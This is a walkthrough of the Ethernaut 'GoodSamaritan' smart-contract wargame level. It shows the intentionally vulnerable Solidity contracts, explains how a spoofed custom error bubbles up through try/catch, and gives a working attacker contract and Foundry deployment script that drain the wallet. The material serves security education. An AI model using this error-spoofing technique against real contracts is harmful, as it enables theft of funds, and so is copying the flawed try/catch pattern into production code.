# Ethernaut Level 27 GoodSamaritan

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

Our job is to empty the Good Samaritan's wallet. It is impossible to drain the Samaritan's wallet by calling `donate10()` through `requestDonation()` many times since the wallet balance (10 ** 6) is massive. We have to figure out a way to throw the code to the `catch` branch so that the Samaritan will call `wallet.transferRemainder()` to transfer all his balance to us in *one* shot.

To achieve that goal, we have to make the underlying `transfer` function in contract `Coin` revert the exact `NotEnoughBalnce()` error in `try`, then do nothing when in `catch` so that the balance of Samaritan can be successfully transferred.

Note that we can do that by customizing the `function notify(uint256 amount) external`. Just as the Ethernaut documentation for this challenge:

> Custom errors in Solidity are identified by their 4-byte ‘selector’, the same as a function call. They are bubbled up through the call chain until they are caught by a catch statement in a try-catch block, as seen in the GoodSamaritan's `requestDonation()` function. For these reasons, it is not safe to assume that the error was thrown by the immediate target of the contract call (i.e., Wallet in this case). Any other contract further down in the call chain can declare the same error and throw it at an unexpected location, such as in the `notify(uint256 amount)` function in your attacker contract.

`MaliciousDest.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract MaliciousDest {
    error NotEnoughBalance();
    address goodSamaritan;

    constructor(address _goodSamaritan) {
        goodSamaritan = _goodSamaritan;
    }

    function notify(uint256 amount) external {
        if(amount == 10) {
            revert NotEnoughBalance();
        } else {
            this;
        }
    }

    function attack() external returns (bool) {
        return IGoodSamaritan(goodSamaritan).requestDonation();
    }
}
```

In the `notify` logic, if the amount is still 10, we will revert the same error `NotEnoughBalance()`.

`GoodSamaritan.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {Script, console} from "forge-std/Script.sol";
import {MaliciousDest} from "../src/MaliciousDest.sol";

contract GoodSamaritanScript is Script {
    address goodSamaritanAddress = 0xXXXXXXXXXXXXX;
    MaliciousDest dest;

    function run() external {
        vm.startBroadcast();
        dest = new MaliciousDest(goodSamaritanAddress);
        bool result = dest.attack();
        console.log("Samaritan has enough balance:", result);
        vm.stopBroadcast();
    }

}
```

